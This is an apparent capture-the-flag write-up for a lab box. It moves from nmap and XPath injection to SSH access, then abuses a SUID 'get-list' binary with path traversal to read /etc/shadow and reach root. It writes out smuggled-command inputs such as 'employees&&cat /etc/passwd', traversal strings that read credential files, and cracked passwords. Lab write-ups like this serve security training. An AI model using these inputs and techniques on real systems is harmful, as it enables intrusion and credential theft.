nmap shows ports 22, 80 open
webpage on 80 has `/login` `/register` `/portal`
if we register with any random account, we cant access `/portal`
There's a `info@wheels.service` provided in the webpage. 
Turns out, if we register using that email, the password gets reset for that email, and we can login with our creds.
Did not work for me. Following the walkthrough, there's a `work` parameter in the url, which is appearently vulnerable to XPATH, evident from changing `?work&` to `?work'&`
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md
https://book.hacktricks.xyz/pentesting-web/xpath-injection

Anyways, we end up with bob : Iamrockinginmyroom1212

ssh bob@IP
bob!

---
```zsh
#looking at /opt, we see a file get-list has SUID bit set
#to understand what the binary does, we transfer it to kali
strings get-list
#Which List do you want to open? [customers/employees]: 
#customers  employees
#Opening File....
#/bin/cat /root/details/%s

#Tried the following
./get-list
	../../../etc/passwd
	employees
	employeeser
	employees;
	employees&&cat /etc/passwd
#The conclusion was, "employees must be present in the string, and it shouldn't have any subsequent symbols?"
#so we land at
	../../../etc/passwd #employees
#This gives us the file
	../../../etc/shadow
#get root stuff, decrypt it with john,
su root #highschoolmusical
#root!
```
